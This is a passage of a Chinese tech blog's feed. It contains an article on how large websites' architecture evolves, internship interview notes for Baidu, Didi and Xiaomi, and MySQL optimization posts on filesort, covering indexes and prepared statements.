        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 架构是根据业务需求不断完善的 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>一个成熟的大型网站（如淘宝、天猫、腾讯等）的系统架构并不是一开始设计时就具备完整的高性能、高可用、高伸缩等特性的，它是随着用户量的增加，业务功能的扩展逐渐演变完善的，在这个过程中，开发模式、技术架构、设计思想也发生了很大的变化，就连技术人员也从几个人发展到一个部门甚至一条产品线。</p><p>所以成熟的系统架构是随着业务的扩展而逐步完善的，并不是一蹴而就；不同业务特征的系统，会有各自的侧重点，例如：淘宝，要解决海量的商品信息的搜索、下单、支付，例如腾讯，要解决数亿用户的实时消息传输，百度它要处理海量的搜索请求，他们都有各自的业务特性，系统架构也有所不同。</p><p>尽管如此我们也可以从这些不同的网站背景下，找出其中共用的技术，这些技术和手段广泛运用在大型网站系统的架构中，下面就通过介绍大型网站系统的演化过程，来认识这些技术和手段。</p><h3 id="演化之路"><a href="#演化之路" class="headerlink" title="演化之路"></a>演化之路</h3><h4 id="最开始的网站架构"><a href="#最开始的网站架构" class="headerlink" title="最开始的网站架构"></a>最开始的网站架构</h4><p>最初的架构，应用程序、数据库、文件都部署在一台服务器上，如图：</p><img src="/2018/11/25/2018-11-25-大型网站系统架构演化之路/pic1.png"><h4 id="应用、数据、文件分离"><a href="#应用、数据、文件分离" class="headerlink" title="应用、数据、文件分离"></a>应用、数据、文件分离</h4><p>随着业务的扩展，一台服务器已经不能满足性能需求，故将应用程序、数据库、文件各自部署在独立的服务器上，并且根据服务器的用途配置不同的硬件，达到最佳的性能效果。</p><img src="/2018/11/25/2018-11-25-大型网站系统架构演化之路/pic2.png"><h4 id="利用缓存改善网站性能"><a href="#利用缓存改善网站性能" class="headerlink" title="利用缓存改善网站性能"></a>利用缓存改善网站性能</h4><p>在硬件优化性能的同时，同时也通过软件进行性能优化，在大部分的网站系统中，都会利用缓存技术改善系统的性能，使用缓存主要源于热点数据的存在，大部分网站访问都遵循28原则（即80%的访问请求，最终落在20%的数据上），所以我们可以对热点数据进行缓存，减少这些数据的访问路径，提高用户体验。</p><img src="/2018/11/25/2018-11-25-大型网站系统架构演化之路/pic3.png"><p>缓存实现常见的方式是本地缓存、分布式缓存。当然还有CDN、反向代理等，这个后面再讲。</p><p>本地缓存，顾名思义是将数据缓存在应用服务器本地，可以存在内存中，也可以存在文件，OSCache就是常用的本地缓存组件。本地缓存的特点是速度快，但因为本地空间有限所以缓存数据量也有限。</p><p>分布式缓存的特点是，可以缓存海量的数据，并且扩展非常容易，在门户类网站中常常被使用，速度按理没有本地缓存快，常用的分布式缓存是Memcached、Redis。</p><h4 id="使用集群改善应用服务器性能"><a href="#使用集群改善应用服务器性能" class="headerlink" title="使用集群改善应用服务器性能"></a>使用集群改善应用服务器性能</h4><p>应用服务器作为网站的入口，会承担大量的请求，我们往往通过应用服务器集群来分担请求数。应用服务器前面部署负载均衡服务器调度用户请求，根据分发策略将请求分发到多个应用服务器节点。</p><img src="/2018/11/25/2018-11-25-大型网站系统架构演化之路/pic4.png"><p>常用的负载均衡技术硬件的有F5，价格比较贵，软件的有LVS、Nginx、HAProxy。</p><p>LVS是四层负载均衡，根据目标地址和端口选择内部服务器，Nginx和HAProxy是七层负载均衡，可以根据报文内容选择内部服务器，因此LVS分发路径优于Nginx和HAProxy，性能要高些，而Nginx和HAProxy则更具配置性，如可以用来做动静分离（根据请求报文特征，选择静态资源服务器还是应用服务器）。</p><h4 id="数据库读写分离和分库分表"><a href="#数据库读写分离和分库分表" class="headerlink" title="数据库读写分离和分库分表"></a>数据库读写分离和分库分表</h4><p>随着用户量的增加，数据库成为最大的瓶颈，改善数据库性能常用的手段是进行读写分离以及分库分表。</p><p>读写分离顾名思义就是将数据库分为读库和写库，通过主备功能实现数据同步。</p><p>分库分表则分为水平切分和垂直切分，水平切分则是对一个数据库特大的表进行拆分，例如用户表。垂直切分则是根据业务的不同来切分，如用户业务、商品业务相关的表放在不同的数据库中。</p><img src="/2018/11/25/2018-11-25-大型网站系统架构演化之路/pic5.png"><h4 id="使用CDN和反向代理提高网站性能"><a href="#使用CDN和反向代理提高网站性能" class="headerlink" title="使用CDN和反向代理提高网站性能"></a>使用CDN和反向代理提高网站性能</h4><p>假如我们的服务器都部署在成都的机房，对于四川的用户来说访问是较快的，而对于北京的用户访问是较慢的，这是由于四川和北京分别属于电信和联通的不同发达地区，北京用户访问需要通过互联路由器经过较长的路径才能访问到成都的服务器，返回路径也一样，所以数据传输时间比较长。对于这种情况，常常使用CDN解决，CDN将数据内容缓存到运营商的机房，用户访问时先从最近的运营商获取数据，这样大大减少了网络访问的路径。比较专业的CDN运营商有蓝汛、网宿。</p><p>而反向代理，则是部署在网站的机房，当用户请求达到时首先访问反向代理服务器，反向代理服务器将缓存的数据返回给用户，如果没有缓存数据才会继续访问应用服务器获取，这样做减少了获取数据的成本。反向代理有Squid，Nginx。</p><img src="/2018/11/25/2018-11-25-大型网站系统架构演化之路/pic6.png"><h4 id="使用分布式文件系统"><a href="#使用分布式文件系统" class="headerlink" title="使用分布式文件系统"></a>使用分布式文件系统</h4><p>用户一天天增加，业务量越来越大，产生的文件越来越多，单台的文件服务器已经不能满足需求，这时就需要分布式文件系统的支撑。常用的分布式文件系统有GFS、HDFS、TFS。</p><img src="/2018/11/25/2018-11-25-大型网站系统架构演化之路/pic7.png"><h4 id="使用NoSQL和搜索引擎"><a href="#使用NoSQL和搜索引擎" class="headerlink" title="使用NoSQL和搜索引擎"></a>使用NoSQL和搜索引擎</h4><p>对于海量数据的查询和分析，我们使用nosql数据库加上搜索引擎可以达到更好的性能。并不是所有的数据都要放在关系型数据中。常用的NOSQL有mongodb、hbase、redis，搜索引擎有lucene、solr、elasticsearch。</p><img src="/2018/11/25/2018-11-25-大型网站系统架构演化之路/pic8.png"><h4 id="将应用服务器进行业务拆分"><a href="#将应用服务器进行业务拆分" class="headerlink" title="将应用服务器进行业务拆分"></a>将应用服务器进行业务拆分</h4><p>随着业务进一步扩展，应用程序变得非常臃肿，这时我们需要将应用程序进行业务拆分，如百度分为新闻、网页、图片等业务。每个业务应用负责相对独立的业务运作。业务之间通过消息进行通信或者共享数据库来实现。</p><img src="/2018/11/25/2018-11-25-大型网站系统架构演化之路/pic9.png"><h4 id="搭建分布式服务"><a href="#搭建分布式服务" class="headerlink" title="搭建分布式服务"></a>搭建分布式服务</h4><p>这时我们发现各个业务应用都会使用到一些基本的业务服务，例如用户服务、订单服务、支付服务、安全服务，这些服务是支撑各业务应用的基本要素。我们将这些服务抽取出来利用分部式服务框架搭建分布式服务。阿里的Dubbo是一个不错的选择。</p><img src="/2018/11/25/2018-11-25-大型网站系统架构演化之路/pic10.png"><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>大型网站的架构是根据业务需求不断完善的，根据不同的业务特征会做特定的设计和考虑，本文只是讲述一个常规大型网站会涉及的一些技术和手段。</p>]]></content>
      
      
      <categories>
          
          <category> 架构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>百度面经（实习）</title>
      <link href="/2018/09/29/2018-09-29-%E7%99%BE%E5%BA%A6%E9%9D%A2%E7%BB%8F%EF%BC%88%E5%AE%9E%E4%B9%A0%EF%BC%89/"/>
      <url>/2018/09/29/2018-09-29-%E7%99%BE%E5%BA%A6%E9%9D%A2%E7%BB%8F%EF%BC%88%E5%AE%9E%E4%B9%A0%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 不亏是BAT之一，压力山大 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="一面"><a href="#一面" class="headerlink" title="一面"></a>一面</h3><p>其实28号下午接到滴滴hr电话后不久，百度电话就来了…<br>当时在练车，就说不太方便，然后推迟到晚上，结果晚上并没有等来电话。<br>后来发短信去问，又说是第二天早上10点。</p><p>本以为又会推迟一会吧，结果来的很准时。 </p><ul><li>自我介绍</li><li>前端能力</li><li>MySQL的二级索引</li><li>数据库表的设计</li><li>索引的用处，为什么索引会快</li><li>Linux查看文件一共多少行，查看倒数200行（grep、wc、tail）</li><li>非对称加密和对称加密的实现过程（rsa、ase、token）</li><li>git实现原理，用过的git命令</li><li>MVC的理解</li><li>Python爬虫用过什么库（requests）</li></ul><p>感觉百度问的问题全看你能深入到哪，不会问一个具体的业务场景，所以最好要有比较全面的知识掌握。</p><h3 id="二面"><a href="#二面" class="headerlink" title="二面"></a>二面</h3><p>二面是等了又等，终于等来。没有当即记录，具体的问题忘了很多。</p><ul><li>自我介绍</li><li>redis遇到的问题（hash冲突）</li></ul><h3 id="hr面-or-后记"><a href="#hr面-or-后记" class="headerlink" title="hr面 or 后记"></a>hr面 or 后记</h3><p>当时以为百度凉凉，结果入职小米的第一天下午又接到电话。<br>其实也不清楚是不是hr打来的，电话里又向我确认了一遍实习时间。<br>但总之也是没有下文了…</p>]]></content>
      
      
      <categories>
          
          <category> 面经 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面经 </tag>
            
            <tag> 实习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>滴滴面经（实习）</title>
      <link href="/2018/09/25/2018-09-25-%E6%BB%B4%E6%BB%B4%E9%9D%A2%E7%BB%8F%EF%BC%88%E5%AE%9E%E4%B9%A0%EF%BC%89/"/>
      <url>/2018/09/25/2018-09-25-%E6%BB%B4%E6%BB%B4%E9%9D%A2%E7%BB%8F%EF%BC%88%E5%AE%9E%E4%B9%A0%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 没有做太多准备，十分lucky <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="一面"><a href="#一面" class="headerlink" title="一面"></a>一面</h3><p>滴滴的一面前就拿到了小米的offer，所以没有过多准备，甚至在当天才想起来下午还有一个滴滴面试…</p><ul><li>自我介绍</li><li>GET和POST的区别</li><li>content-type</li><li>http状态码（200/404/500）</li><li>SESSION和COOKIE</li><li>in_array和array_key_exits</li><li>传值和传引用的区别</li><li>mysql的存储引擎</li><li>mysql事务</li><li>读未提交的影响（脏读、不可重复读、幻读、不可串行化）</li><li>id设为主键，通过学号查找学生</li><li>mysql索引（主键索引、组合索引、前缀索引）</li><li>组合索引（命中）</li><li>redis使用过的业务场景</li><li>redis数据结构</li><li>list与set的区别（set数据不重复，list双向链表，zset跳跃表）</li><li>你有什么要问的吗</li></ul><p>这个实验室的小伙伴帮我录音了，听了一遍回答，感觉自己废话有点多…</p><h3 id="二面"><a href="#二面" class="headerlink" title="二面"></a>二面</h3><p>一面完大概20分钟，二面面试官就加我微信准备二面了。</p><ul><li>自我介绍</li><li>校园助手负责的功能介绍（提到成绩计算从客户端重构至服务器端）</li><li>客户端处理和服务器端处理的区别（安全性）</li><li>数据同步脚本（吐槽了教务系统数据库的设计不合理）</li><li>为什么不合理（积攒已久的怨念全说出来了…）</li><li>如何确保同步数据的完整性（临时表、增量同步、学生反馈，面试官说还有更好的方式：回滚log、登录失败的自动反馈等等）</li><li>数据库的事务</li><li>mysql存储引擎</li><li>sql语句从输入到执行的过程</li><li>对称加密和非对称加密使用的算法（rsa、ase）</li><li>redis常用的数据结构（string、hash、list、set、zset）</li><li>自动化报表系统数据库表的设计</li><li>说一下你设计的登录流程</li><li>CI框架的路由实现</li><li>权限表与用户表的外键约束</li><li>知道一个权限如何找出用户表中所有符合的用户（左外联接）</li><li>TCP的三次握手和四次挥手</li><li>跨域是跨域名还是端口</li><li>两个栈实现一个队列</li><li>一共50个人，围一个圈，每三个人就剔除一个人，求出最后剩下的人</li><li>你还有什么要问的吗</li></ul><p>整体来说，二面的面试官特别的慈祥…<br>我没答上来的问题，他就很开心的说，不知道了吧，要不要我告诉你（很皮）<br>恩…感觉挺有意思的一个人</p><h3 id="hr面"><a href="#hr面" class="headerlink" title="hr面"></a>hr面</h3><p>大概隔了一天吧，下午练车的时候打的电话。<br>感觉hr有点累，没有问我什么，就跟我确认了一下入职时间，然后说了一下薪资待遇。</p><p>大概就是这样。</p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>考虑到很多方面，最终还是拒掉了滴滴offer，秋招再见吧！</p>]]></content>
      
      
      <categories>
          
          <category> 面经 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面经 </tag>
            
            <tag> 实习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小米面经（实习）</title>
      <link href="/2018/09/20/2018-09-20-%E5%B0%8F%E7%B1%B3%E9%9D%A2%E7%BB%8F%EF%BC%88%E5%AE%9E%E4%B9%A0%EF%BC%89/"/>
      <url>/2018/09/20/2018-09-20-%E5%B0%8F%E7%B1%B3%E9%9D%A2%E7%BB%8F%EF%BC%88%E5%AE%9E%E4%B9%A0%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 人生中的第一次面试，难免紧张 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="一面"><a href="#一面" class="headerlink" title="一面"></a>一面</h3><p>晚上10点刚洗完澡就一个电话打过来，面试官正在下班的路上…<br>因为洗澡前投递的简历，没想到会这么快，啥都没准备，只好硬着头皮上。</p><ul><li>一些基本情况</li><li>redis使用过的数据结构（string、hash、list、set、zset）</li><li>redis list的数据结构（双向链表、计数器、void型的数据域指针）</li><li>为什么使用websocket，php不用swoole怎么实现</li><li>校园助手的数据库设计</li></ul><p>大概就是这些，整体来说都是围绕者项目来讲的，电面的时长也比较短。<br>因为准备不充分，有些问题没有回答的很好，当时以为凉了。</p><h3 id="二面"><a href="#二面" class="headerlink" title="二面"></a>二面</h3><p>第二天抱着忐忑的心情，没想到上课途中又来了一个电话，然后约了当天下午6点的面试。<br>二面是通过微信语音面的，群里有两个人，一个是昨天面我的，还有一个是今天的。</p><ul><li>自我介绍</li><li>redis的数据结构</li><li>redis两种set有何不同（都是不可重复的，zset会根据设置的权重进行排序）</li><li>正向代理与反向代理（扯到了负载均衡）</li><li>设计一个负载均衡的实现（权值轮询、ip_hash）</li><li>软负载和硬负载</li><li>mysql索引有哪几种（主键索引、组合索引、前缀索引）</li><li>组合索引的命中问题</li><li>使用索引的优缺点</li><li>内连接、左连接、右连接</li><li>ACID事务是什么，举个栗子说明（感觉表述的不是很清楚）</li><li>linux命令，查看磁盘空间，查看cpu，显示匹配单词所在的行，文件无损合并无损拆分</li><li>冒泡排序和快速排序的不同</li><li>时间复杂度和空间复杂度的概念</li><li>常用的数据结构</li><li>队列和栈的区别</li><li>树的先序遍历和后序遍历</li><li>异步同步的区别</li><li>接口的幂等性</li></ul><p>整体感觉还是基于项目提到的知识点来问的，可惜的就是准备还是不够充分。<br>感觉面试官偏爱数据结构，算法问到的不是很多，关于操作系统、计算机网络方便的问题基本没问。<br>还有，我面的PHP岗，竟然一个PHP相关的问题都没有问我。</p><h3 id="hr面"><a href="#hr面" class="headerlink" title="hr面"></a>hr面</h3><p>其实二面完的当天晚上9点30，一面的面试官就微信告知我面试通过。<br>可是当时沉迷学校的一个项目并没有看到，晚上12点才看到。</p><p>第二天睡觉睡到一半，hr打电话过来了，大概问了一些实习情况，然后说明了薪资水平。<br>这里有一点挺尴尬的，我是在实习僧上找的实习，邮箱忘记填了，然后hr小姐姐问了我的邮箱…</p><p>拿到的第一个offer，还是比较激动的。</p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>经过陆陆续续将近一个月的实习试水面试，最后还是选择了去小米。一方面是因为比较感兴趣部门的业务，一方面也是因为面试官（后来才知道是组里老大）比较亲切。总之，保持激情保持学习，加油。</p>]]></content>
      
      
      <categories>
          
          <category> 面经 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面经 </tag>
            
            <tag> 实习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL优化之order by</title>
      <link href="/2018/09/05/2018-09-05-MySQL%E4%BC%98%E5%8C%96%E4%B9%8Border%20by/"/>
      <url>/2018/09/05/2018-09-05-MySQL%E4%BC%98%E5%8C%96%E4%B9%8Border%20by/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 如何进行更有效排序 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在我们使用order by排序的时候，如果用explain分析一下sql语句，会发现有的情况下Extra列会出现Using filesort。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">EXPLAIN SELECT * FROM tbl_organization where id &gt; &apos;SQ0000&apos; ORDER BY site_id;</span><br><span class="line"></span><br><span class="line">Name         |Value                      |</span><br><span class="line">-------------|---------------------------|</span><br><span class="line">id           |1                          |</span><br><span class="line">select_type  |SIMPLE                     |</span><br><span class="line">table        |tbl_organization           |</span><br><span class="line">type         |range                      |</span><br><span class="line">possible_keys|PRIMARY                    |</span><br><span class="line">key          |PRIMARY                    |</span><br><span class="line">key_len      |62                         |</span><br><span class="line">ref          |                           |</span><br><span class="line">rows         |492                        |</span><br><span class="line">Extra        |Using where; Using filesort|</span><br></pre></td></tr></table></figure><h3 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h3><p>什么是filesort呢？首先引用官方手册中的描述：</p><blockquote><p>MySQL must do an extra pass to find out how to retrieve the rows in sorted order. The sort is done by going through all rows according to the join type and storing the sort key and pointer to the row for all rows that match the WHERE clause.</p></blockquote><p>中文手册：</p><blockquote><p>Mysql需要额外的一次传递，以找出如何按排序顺序检索行，通过根据联接类型浏览所有行并为所有匹配where子句的行保存排序关键字和行的指针来完成排序，然后关键字被排序，并按排序顺序检索行。</p></blockquote><p>总而言之，filesort是一种比较慢的外部排序，应该尽量using index，避免using filesort。</p><h3 id="避免"><a href="#避免" class="headerlink" title="避免"></a>避免</h3><p>以下条件均会使用filesort，尽量避免：</p><ul><li>不满足<a href="/2019/01/19/索引的最左前缀原则/">索引的最左前缀原则</a></li><li>where语句与order by语句，使用了不同的索引</li><li>检查的行数过多，且没有使用覆盖索引</li><li>ORDER BY中的列不包含在相同的索引，也就是使用了不同的索引</li><li>对索引列同时使用了ASC和DESC</li><li>where语句或者ORDER BY语句中索引列使用了表达式，包括函数表达式</li><li>where 语句与ORDER BY语句组合满足最左前缀，但where语句中使用了条件查询。查见第10句,虽然where与order by构成了索引最左有缀的条件，但是where子句中使用的是<strong>条件查询</strong>。</li></ul><h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><p>在MySQL中filesort 的实现算法实际上是有两种：<br><strong>双路排序</strong>：是首先根据相应的条件取出相应的排序字段和可以直接定位行数据的行指针信息，然后在sort buffer 中进行排序。<br><strong>单路排序</strong>：是一次性取出满足条件行的所有字段，然后在sort buffer中进行排序。</p><h4 id="双路排序过程："><a href="#双路排序过程：" class="headerlink" title="双路排序过程："></a>双路排序过程：</h4><ol><li>根据表的索引或者全表扫描，<strong>读取所有满足条件的记录</strong>。</li><li>对于每一行，<strong>存储一对值到缓冲区（排序列，行记录指针）</strong>，一个是排序的索引列的值，即order by用到的列值，和指向该行数据的行指针，缓冲区的大小为sort_buffer_size大小。</li><li>当缓冲区满后，运行一个快速排序（qsort）来将缓冲区中数据排序，并将排序完的数据存储到一个临时文件，并保存一个存储块的指针，当然如果缓冲区不满，则不会重建临时文件了。</li><li>重复以上步骤，直到将所有行读完，并建立相应的有序的临时文件。</li><li>对块级进行排序，这个类似与归并排序算法，只通过两个临时文件的指针来不断交换数据，最终达到两个文件，都是有序的。</li><li>重复5直到所有的数据都排序完毕。</li><li>采取顺序读的方式，将每行数据读入内存，并取出数据传到客户端，这里读取数据时并不是一行一行读，读如缓存大小由read_rnd_buffer_size来指定。</li></ol><p>采取的方法为：快速排序 + 归并排序，但有一个问题，就是，一行数据会被读两次，第一次是where条件过滤时，第二个是排完序后还得用行指针去读一次。</p><h4 id="单路排序过程："><a href="#单路排序过程：" class="headerlink" title="单路排序过程："></a>单路排序过程：</h4><ol><li>读取满足条件的记录</li><li>对于每一行，记录排序的key和数据行指针，并且把要查询的列也读出来</li><li>根据索引key排序</li><li>读取排序完成的文件，并直接根据数据位置读取数据返回客户端，而不是去访问表</li></ol><p>这也有一个问题：当获取的列很多的时候，排序起来就很占空间，因此，max_length_for_sort_data变量就决定了是否能使用这个排序算法。</p><h4 id="建议："><a href="#建议：" class="headerlink" title="建议："></a>建议：</h4><ol><li>对于使用filesort的慢查询，可以改小一些max_length_for_sort_data来使用第一个方法</li><li>对于想要加快order by 的顺序，有以下一些策略：<ul><li>增加sort_buffer_size的大小，如果大量的查询较小的话，这个很好，就缓存中就搞定了</li><li>增加read_rnd_buffer_size大小，可以一次性多读到内存中</li><li>列的长度尽量小些</li><li>改变tmpdir，使其指向多个物理盘(不是分区)的目录，这将机会循环使用做为临时文件区</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
            <tag> 数据库 </tag>
            
            <tag> 数据库优化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL优化之覆盖索引</title>
      <link href="/2018/09/04/2018-09-04-MySQL%E4%BC%98%E5%8C%96%E4%B9%8B%E8%A6%86%E7%9B%96%E7%B4%A2%E5%BC%95/"/>
      <url>/2018/09/04/2018-09-04-MySQL%E4%BC%98%E5%8C%96%E4%B9%8B%E8%A6%86%E7%9B%96%E7%B4%A2%E5%BC%95/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 只需扫描索引而无需回表 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>MySQL可以利用索引返回SELECT列表中的字段，而不必根据索引再次读取数据文件，包含所有满足查询需要的数据的索引成为覆盖索引(Covering Index)，也就是平时所说的不需要回表操作。</p><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><p>只扫描索引而无需回表的优点：</p><ol><li>索引条目通常远小于数据行大小，只需要读取索引，则mysql会极大地减少数据访问量。</li><li>因为索引是按照列值顺序存储的，所以对于IO密集的范围查找会比随机从磁盘读取每一行数据的IO少很多。</li><li>一些存储引擎如myisam在内存中只缓存索引，数据则依赖于操作系统来缓存，因此要访问数据需要一次系统调用</li><li>innodb的聚簇索引，覆盖索引对innodb表特别有用。(innodb的二级索引在叶子节点中保存了行的主键值，所以如果二级主键能够覆盖查询，则可以避免对主键索引的二次查询)</li></ol><p>覆盖索引必须要存储索引列的值，而哈希索引、空间索引和全文索引不存储索引列的值，所以mysql<strong>只能用B-tree索引</strong>做覆盖索引。</p><h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><p>假设存在如下表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `student` (</span><br><span class="line">  `id` bigint(20) NOT NULL,</span><br><span class="line">  `pid` int(20) NOT NULL,</span><br><span class="line">  `age` varchar(255) NOT NULL,</span><br><span class="line">  `school` varchar(255) NOT NULL,</span><br><span class="line">  PRIMARY KEY (`id`),</span><br><span class="line">  KEY `pid` (`pid`),</span><br><span class="line">  KEY `school_age` (`school`,`age`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br></pre></td></tr></table></figure><p>如果在该表上执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">explain select count(*) from student;</span><br><span class="line"></span><br><span class="line">id|select_type|table  |type |possible_keys|key|key_len|ref|rows|Extra      |</span><br><span class="line">--|-----------|-------|-----|-------------|---|-------|---|----|-----------|</span><br><span class="line"> 1|SIMPLE     |student|index|             |pid|5      |   | 165|Using index|</span><br></pre></td></tr></table></figure><p>遍历聚集索引和辅助索引都可以统计出结果，但辅助索引要远小于聚集索引，所以优化器会选择辅助索引来统计。key和Extra显示使用了pid这个辅助索引。</p><p>还有，假设执行以下sql：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">explain select *  from student where age &gt; 10 and age &lt; 15;</span><br><span class="line"></span><br><span class="line">id|select_type|table   |type|possible_keys|key|key_len|ref|rows|Extra      |</span><br><span class="line">--|-----------|--------|----|-------------|---|-------|---|----|-----------|</span><br><span class="line"> 1|SIMPLE     |students|ALL |             |   |       |   |   1|Using where|</span><br></pre></td></tr></table></figure><p>因为联合索引school_age的字段顺序是先school再age，按照age做条件查询，不会命中索引。</p><p>但是，如果保持条件不变，查询所有字段改为查询条目数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">explain select count(*) from student where age &gt; 10 and age &lt; 15;</span><br><span class="line"></span><br><span class="line">id|select_type|table   |type |possible_keys|key           |key_len|ref|rows|Extra                   |</span><br><span class="line">--|-----------|--------|-----|-------------|--------------|-------|---|----|------------------------|</span><br><span class="line"> 1|SIMPLE     |students|index|             |idx_school_age|1534   |   |   1|Using where; Using index|</span><br></pre></td></tr></table></figure><p>优化器会选择这个联合索引。</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
            <tag> 数据库 </tag>
            
            <tag> 索引 </tag>
            
            <tag> 数据库优化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL优化之绑定变量</title>
      <link href="/2018/09/03/2018-09-03-MySQL%E4%BC%98%E5%8C%96%E4%B9%8B%E7%BB%91%E5%AE%9A%E5%8F%98%E9%87%8F/"/>
      <url>/2018/09/03/2018-09-03-MySQL%E4%BC%98%E5%8C%96%E4%B9%8B%E7%BB%91%E5%AE%9A%E5%8F%98%E9%87%8F/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 既安全又高效 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>从MySQL4.1版本开始，就支持服务器端的绑定变量（prepared statement）。</p><p>当创建一个绑定变量SQL时，客户端向服务器发送一个SQL语句的原型。服务器端接收到这个SQL语句后，解析并存储这个SQL语句的部分执行计划，返回给客户端一个SQL语句处理句柄。以后每次执行这类查询，客户端都指定使用这个句柄。</p><h3 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h3><ol><li>可以更高效地执行大量的重复语句：<ul><li>在服务器端只需要解析一次SQL语句</li><li>在服务器端某些优化项的工作只需要执行一次，因为它会缓存一部分的执行计划</li><li>以二进制的方式只发送参数和句柄，比起每次都发送ASC2码文本效率更高</li><li>仅仅是参数——而不是整个查询语句——需要发送到服务器端，所以网络开销会更小</li><li>MySQL在存储参数的时候，直接将其存放到缓存中，不再需要在内存中多次复制</li></ul></li><li>绑定变量相对也更安全。无须在应用程序中处理转义，一则更简单了，二则也大大减少了SQL注入和攻击的风险</li><li>最主要的用途就是在存储过程中使用，构建并执行“动态”的SQL语句</li></ol><h3 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h3><ul><li>绑定变量是会话级别的，所以连接之间不能共用绑定变量句柄</li><li>在5.1版本之前，绑定变量的SQL是不能使用查询缓存的</li><li>并不是所有的时候使用绑定变量都能获得更好的性能</li><li>如果总是忘记释放绑定变量资源，则在服务器端很容易发生资源“泄漏”</li><li>有些操作，比如BEGIN，无法在绑定变量中完成</li></ul><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><ol><li>客户端模拟的绑定变量：客户端的驱动程序接收一个带参数的SQL，再将指定的值带入其中，最后将完整的查询发送给服务器端。</li><li>服务器端的绑定变量：客户端使用特殊的二进制协议将带参数的字符串发送到服务器端，然后使用二进制协议将具体的参数值发送给服务器端并执行。</li><li>SQL接口的绑定变量：客户端先发送一个带参数的字符串到服务器端，这类似于使用PREPARE的SQL语句，然后发送设置参数的SQL，最后使用EXECUTE来执行SQL。所有这些都是使用普通的文本传输协议。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
            <tag> 数据库 </tag>
            
            <tag> 数据库优化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL优化之查询缓存</title>
      <link href="/2018/09/02/2018-09-02-MySQL%E4%BC%98%E5%8C%96%E4%B9%8B%E6%9F%A5%E8%AF%A2%E7%BC%93%E5%AD%98/"/>
      <url>/2018/09/02/2018-09-02-MySQL%E4%BC%98%E5%8C%96%E4%B9%8B%E6%9F%A5%E8%AF%A2%E7%BC%93%E5%AD%98/</url>
      
